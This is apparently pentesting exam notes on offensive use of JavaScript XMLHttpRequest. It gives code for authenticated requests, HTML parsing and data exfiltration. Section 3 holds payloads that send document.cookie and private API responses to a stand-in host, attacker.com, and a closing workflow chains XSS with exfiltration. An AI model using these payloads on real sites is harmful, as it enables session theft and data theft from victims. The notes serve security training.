## JavaScript for Pentesters — XMLHttpRequest (XHR)

## Objective
Use XHR to:
- Send requests
- Fetch data from endpoints
- Exfiltrate information
- Parse responses

Think: *“Can I use the browser as a proxy to interact with backend APIs?”*

---

## 1. Posting with XMLHttpRequest

### Basic POST request

```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api", true);
xhr.setRequestHeader("Content-Type", "application/json");

xhr.send(JSON.stringify({
  username: "admin",
  password: "test"
}));
```

---

### Form-style POST

```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", "/login", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.send("username=admin&password=1234");
```

---

## 2. Fetching Data with XMLHttpRequest

### Basic GET request

```javascript
var xhr = new XMLHttpRequest();
xhr.open("GET", "/api/data", true);

xhr.onload = function() {
  console.log(xhr.responseText);
};

xhr.send();
```

---

### With credentials (cookies)

```javascript
var xhr = new XMLHttpRequest();
xhr.open("GET", "/api/private", true);
xhr.withCredentials = true;

xhr.onload = function() {
  console.log(xhr.responseText);
};

xhr.send();
```

---

## 3. Data Exfiltration with XMLHttpRequest

### Goal
Send captured data to attacker server

---

### Example

```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://attacker.com/collect", true);
xhr.setRequestHeader("Content-Type", "application/json");

xhr.send(JSON.stringify({
  data: document.cookie
}));
```

---

### Exfiltrate response data

```javascript
var xhr = new XMLHttpRequest();
xhr.open("GET", "/api/private", true);

xhr.onload = function() {
  var exfil = new XMLHttpRequest();
  exfil.open("POST", "https://attacker.com", true);
  exfil.send(xhr.responseText);
};

xhr.send();
```

---

## 4. HTML Parsing of XHR Response

### Goal
Extract data from HTML response

---

### Example

```javascript
var xhr = new XMLHttpRequest();
xhr.open("GET", "/profile", true);

xhr.onload = function() {
  var parser = new DOMParser();
  var doc = parser.parseFromString(xhr.responseText, "text/html");

  var email = doc.querySelector('#email').innerText;
  console.log(email);
};

xhr.send();
```

---

### Extract multiple elements

```javascript
var items = doc.querySelectorAll('.item');
items.forEach(i => console.log(i.innerText));
```

---

## 5. Common Use Cases

- API interaction
- Authenticated requests (via cookies)
- Data scraping
- Exfiltration
- Chaining with XSS

---

## 6. Limitations

- Same-Origin Policy (SOP)
- CORS restrictions
- Requires JS execution (e.g., XSS)

---

## 7. Indicators of Opportunity

- Sensitive endpoints accessible via JS
- Cookies automatically sent
- Weak CORS policies
- JSON APIs exposed

---

## 8. Fast Workflow (Exam Mode)

1. Execute JS (XSS / console)
2. Send request:
   - GET → fetch data
   - POST → send data
3. Capture response
4. Parse data if needed
5. Exfiltrate to external server
6. Confirm data received

---

## 9. Mental Model

XHR turns the victim’s browser into your tool.

- It has access to:
  - cookies
  - authenticated sessions

If you control JS:
→ You control requests  
→ You control data flow